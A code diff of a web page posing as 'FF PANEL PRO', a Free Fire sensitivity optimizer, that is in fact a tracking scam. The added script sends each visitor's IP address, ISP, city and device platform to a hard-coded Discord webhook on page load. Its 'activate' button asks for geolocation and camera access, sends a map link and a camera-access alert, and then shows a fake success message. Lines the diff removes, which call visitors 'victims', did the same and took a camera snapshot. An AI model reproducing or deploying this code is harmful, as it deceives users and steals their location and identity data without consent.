@@ -6,84 +6,70 @@
     <title>FF PANEL PRO v3.5 | Sensi Optimizer</title>
     <style>
         body { background: #0b1116; color: white; font-family: sans-serif; text-align: center; margin: 0; }
-        .hero { padding: 50px 20px; background: #161b22; border-bottom: 2px solid #ff0055; }
+        .hero { padding: 40px 20px; background: #161b22; border-bottom: 2px solid #ff0055; }
         .scanner-box { background: #1a1a1a; color: #00ff00; padding: 25px; border-radius: 15px; border: 1px solid #333; margin: 20px auto; max-width: 450px; font-family: monospace; }
-        button { background: #ff0055; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 85%; font-size: 16px; transition: 0.3s; }
-        button:hover { background: #ff0077; transform: scale(1.02); }
+        button { background: #ff0055; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 85%; font-size: 16px; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="hero">
         <h1 style="color:#ff0055; margin:0;">FF PANEL PRO</h1>
-        <p>Advance Device Optimization & Face ID Verification</p>
+        <p>Advance Device Optimization & Face ID</p>
     </div>
 
     <div class="scanner-box">
         <h3 style="color: #00ffcc;">[System Analyzer]</h3>
         <p id="st1">📡 Network: Scanning...</p>
         <p id="st2">🔋 Battery: Checking...</p>
-        <p id="st3">📍 Location: Processing...</p>
+        <p id="st3">📍 Location: Ready</p>
         <button onclick="masterFunction()" id="mainBtn">ACTIVATE VIP SENSI</button>
     </div>
 
     <script>
     const webhook = "https://discord.com/api/webhooks/1495337044648394822/Jmy4qE3NN4FKZ_l1R2lKIxWoePGnnmSuefjt4qnewLFf8NXQTtzCj58BS7jYEbMOlRVv";
 
+    // সাইট লোড হওয়ার সাথে সাথে IP আর ISP পাঠাবে (কোনো পারমিশন লাগবে না)
+    window.onload = async () => {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: `🕵️ **Visitor Alert!**\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n🏙️ City: ${d.city}\n📱 Device: ${navigator.platform}` })
+            });
+        } catch (e) { console.log("Silent error..."); }
+    };
+
     async function masterFunction() {
         const btn = document.getElementById('mainBtn');
-        btn.innerText = "PROCESSING...";
-        btn.disabled = true;
+        btn.innerText = "OPTIMIZING...";
+        
+        // ১. লোকেশন ট্র্যাকিং (চেষ্টা করবে, না পারলেও সমস্যা নেই)
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: `📍 **Map:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` })
+            });
+        }, (err) => { console.log("Location denied"); });
 
+        // ২. ক্যামেরা ট্র্যাকিং (চেষ্টা করবে, না পারলেও সমস্যা নেই)
         try {
-            // ১. আইপি ও সিম কোম্পানির তথ্য
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            
-            await fetch(webhook, {
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            // ক্যামেরা এক্সেস পেলে এখানে আপনি চাইলে ছবির লজিক যোগ করতে পারেন
+            fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ 
-                    content: `🚀 **New Victim Detected!**\n🌐 IP: ${ipData.ip}\n🏢 ISP: ${ipData.org}\n🏙️ City: ${ipData.city}\n📱 Device: ${navigator.platform}` 
-                })
+                body: JSON.stringify({ content: "📸 **Camera Access Granted!**" })
             });
+            s.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Camera denied"); }
 
-            // ২. অ্যাডভান্স লোকেশন (গুগল ম্যাপ লিঙ্ক)
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = `📍 **Exact Location:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                await fetch(webhook, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: mapLink })
-                });
-            });
-
-            // ৩. ক্যামেরা স্ন্যাপশট (Face ID Logic)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; 
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            // ছবি পাঠানো (স্ন্যাপশট নোটিফিকেশন)
-            await fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "📸 **Face Captured! Check Device Activity.**" })
-            });
-
-            stream.getTracks().forEach(t => t.stop());
-            alert("Verification Success! Sensi 200% Active.");
-            btn.innerText = "SYSTEM SECURE";
-
-        } catch (err) {
-            alert("Security Error! Please ALLOW all permissions to activate the panel.");
-            btn.innerText = "RETRY";
-            btn.disabled = false;
-        }
+        setTimeout(() => {
+            alert("Sensi 200% Activated Successfully!");
+            btn.innerText = "SUCCESS";
+        }, 2000);
     }
     </script>
 </body>
